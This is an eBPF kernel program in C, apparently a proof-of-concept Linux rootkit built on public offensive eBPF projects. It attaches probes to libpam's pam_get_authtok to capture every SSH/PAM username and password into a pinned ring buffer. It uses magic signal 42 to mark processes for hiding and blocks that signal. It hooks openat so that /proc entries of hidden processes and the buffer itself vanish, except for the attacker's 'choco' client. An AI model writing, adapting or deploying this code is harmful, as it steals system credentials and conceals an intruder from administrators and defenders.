/* SPDX-License-Identifier: GPL-2.0 */
#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <linux/errno.h>

// references:
// https://github.com/pathtofile/bad-bpf/tree/main
// https://github.com/Esonhugh/sshd_backdoor/tree/Skyworship
// https://github.com/bfengj/eBPFeXPLOIT

///

#include "event.h"
#include "hide.h"
#include "sshBackdoor.h"
#include "utils.h"

#if defined(bpf_strstr)
#else
extern int bpf_strstr(const char *str, const char *substr) __ksym;
#endif

SEC("uprobe//usr/lib/libpam.so.0:pam_get_authtok")
int BPF_KPROBE(AuthtokEnter, struct pam_handle *pamh, int item,
               const char **authtok, const char *promt) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;

  bpf_printk("new PAM connection! %d\n", pid);
  bpf_map_update_elem(&pamHandleMap, &pid, &pamh, BPF_ANY);
  bpf_map_update_elem(&authtokMap, &pid, &authtok,
                      BPF_ANY); // start tracking pam

  return 0;
}
struct openat_args {
  const char *filename;
};

SEC("uretprobe//usr/lib/libpam.so.0:pam_get_authtok")
int BPF_KRETPROBE(AuthtokExist, int ret) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;
  pam_handle_t **pamHandlePtr = bpf_map_lookup_elem(&pamHandleMap, &pid);
  if (pamHandlePtr == 0)
    return 0;
  char ***authtokPtr = bpf_map_lookup_elem(&authtokMap, &pid);
  if (authtokPtr == 0)
    return 0;
  struct pam_handle *pamh = NULL;
  char **authtok = NULL;
  pamh = *pamHandlePtr;
  authtok = *authtokPtr;
  if (pamh == NULL || authtok == NULL)
    return 0;
  char *userPtr = NULL;
  char *passPtr = NULL;
  struct sshUserPass *sshUserPass;
  sshUserPass = bpf_ringbuf_reserve(&banana_buffer, sizeof(*sshUserPass), 0);
  if (!sshUserPass) {
    bpf_map_delete_elem(&pamHandleMap, &pid);
    bpf_map_delete_elem(&authtokMap, &pid);
    return 0;
  }
  sshUserPass->type = 69;
  bpf_probe_read_user(&userPtr, sizeof(userPtr), &pamh->user);
  bpf_probe_read_user_str(&sshUserPass->username, MAX_USERNAME_LEN, userPtr);
  bpf_probe_read_user(&passPtr, sizeof(passPtr), authtok);
  bpf_probe_read_user_str(&sshUserPass->password, MAX_PASSWORD_LEN, passPtr);
  bpf_ringbuf_submit(sshUserPass, 0);
  bpf_map_delete_elem(&pamHandleMap, &pid);
  bpf_map_delete_elem(&authtokMap, &pid);
  bpf_printk("user: %s\npassword: %s\n", sshUserPass->username,
             sshUserPass->password);
  bpf_printk("captured credentials!\n");
  return 0;
}
struct process_event {
  __u32 pid;
  char comm[TASK_COMM_LEN];
};

///////////////////
#define MAX_PIDS_TO_HIDE 20
struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, MAX_PIDS_TO_HIDE);
  __type(key, __u32);
  __type(value, pid_t);
} pidToHideMap SEC(".maps");
__u32 index_pids = 0;
#define MAGIC 42

SEC("lsm/task_kill") // temporary for POC
int BPF_PROG(avoidKill, struct task_struct *p, struct kernel_siginfo *info,
             int sig, const struct cred *cred) {
  if (sig == MAGIC) {
    pid_t target_pid = BPF_CORE_READ(p, tgid);
    int i;
    bool found = false;
    bpf_for(i, 0, MAX_PIDS_TO_HIDE) {
      pid_t *value = (pid_t *)bpf_map_lookup_elem(&pidToHideMap, &i);
      if (value == 0 || *value == 0) {
        continue;
      }
      if (target_pid == *value) {
        bpf_map_delete_elem(&pidToHideMap, &i);
        found = true;
      }
    }
    if (found == false) {
      bpf_map_update_elem(&pidToHideMap, &index_pids, &target_pid, BPF_ANY);
      index_pids++;
    }
    bpf_printk("magic performed on %d!!!\n", target_pid);
    return -EPERM;
  }
  return 0;
}

// shit for hiding processes
#define bananas "banana_buffer" // ebpf pinned buffer
#define choco "choco"           // client
SEC("fmod_ret/__x64_sys_openat")
int BPF_PROG(modify_openat, const struct pt_regs *regs) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;
  char comm[TASK_COMM_LEN];
  struct task_struct *parent;
  parent = (struct task_struct *)bpf_get_current_task();

  parent = parent->real_parent;
  bpf_get_current_comm(&comm, sizeof(comm));

  if (bpf_strstr(comm, choco) >= 0 || bpf_strstr(comm, "Utils") >= 0) {
    return 0;
  }
  // Block specific processes from seeing directory entries

  const char *user_filename;
  user_filename = (const char *)regs->si;

  char filename[256];
  int ret = bpf_probe_read_user_str(filename, sizeof(filename), user_filename);
  if (ret < 0) {
    return 0;
  }

  __u32 i;
  pid_t *value;
  bpf_for(i, 0, MAX_PIDS_TO_HIDE) {
    value = (pid_t *)bpf_map_lookup_elem(&pidToHideMap, &i);

    if (value == 0 || *value == 0) {
      continue;
    }

    char pid_str[64];
    BPF_SNPRINTF(pid_str, sizeof(pid_str), "/proc/%d", *value);
    // Use bpf_strncmp or check if filename starts with pid_str
    int len = 0;
#pragma unroll
    for (int j = 0; j < 20 && pid_str[j] != '\0'; j++) {
      len++;
    }

    // Check if filename starts with the pid path
    bool match = true;
#pragma unroll
    for (int j = 0; j < 20; j++) {
      if (j >= len)
        break;
      if (pid_str[j] != filename[j]) {
        match = false;
        break;
      }
    }

    if (match) {
      bpf_printk("blocked pid path: %s\n", pid_str);
      bpf_printk("%s\n", comm);
      return -ENOENT;
    } else {
      if (bpf_strstr(filename, "banana_buffer") >= 0) {
        return -ENOENT;
      }
    }
  }

  return 0;
}

char LICENSE[] SEC("license") = "GPL";
